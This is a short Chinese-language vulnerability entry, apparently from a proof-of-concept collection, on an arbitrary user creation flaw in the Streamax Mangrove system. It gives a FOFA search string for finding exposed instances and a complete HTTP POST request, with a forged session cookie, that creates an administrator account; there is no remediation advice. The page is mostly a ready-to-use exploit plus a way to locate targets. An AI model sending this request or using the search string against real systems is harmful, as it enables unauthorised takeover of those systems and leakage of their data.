## 锐明技术Mangrove系统任意用户创建漏洞

锐明技术Mangrove系统任意用户创建漏洞，远程攻击者可以利用此漏洞创建管理员账户，从而接管系统后台，造成信息泄露，导致系统处于极不安全的状态。

## fofa

```
body="Mvsp/RegisterLogin/Default.do"
```

## poc

```javascript
POST /Mvsp/RoleUserInfo/Default.do?Action=CreateUser&Type=post&DataType=Text&Guid=1721290869914 HTTP/1.1
Host: 
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip, deflate
Cookie: MVSP.U=VUlEPTEmVU49YWRtaW4yJkdJRD0xJlJJRD0x;
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0

UserId=&GroupPower=1&VehiclePower=&UserName=poiuy&RoleId=1&GroupId=1&ValidTime=&VideoTime=1&Enable=1&TelNo=1&Flow=&WarningFlow=&RealFlow=&MonthlyTime=&Description=&Email=&Password=test1234
```

![image-20241012131926688](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410121319743.png)